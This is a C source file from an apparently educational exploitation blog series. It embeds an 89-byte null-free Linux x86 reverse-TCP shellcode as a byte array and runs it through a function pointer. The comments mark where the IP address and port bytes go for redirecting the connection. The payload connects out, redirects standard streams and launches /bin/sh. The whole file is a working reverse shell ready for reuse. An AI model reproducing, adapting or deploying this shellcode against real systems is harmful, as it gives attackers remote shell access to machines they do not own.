/**************************************************
 *
 * Filename: final_reverseshellcode.c
 *
 * Content: It has a 89-byte NULL-byte free Linux-x86 Reverse-TCP Shellcode
 *
 * Author: Adwaith Gautham
 *
 * Written for this blogpost: https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2018/12/02/exploitation-using-code-injection-part03.html
 *
 * Default IP Address: 	"127.1.1.1"
 * Default Port Number:	10000 
 *
 **************************************************/




int main() {

	unsigned char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x93\x66\xb8\x6a\x01\x68" 
	"\x7f\x01\x01\x01"	// IP Address
	"\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
	"\x27\x10"		//htons(10000)
	"\x89\xe1\xb2\x10\xcd\x80\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";


	void (*executeme)()  = shellcode;

	executeme();

	return 0;
}
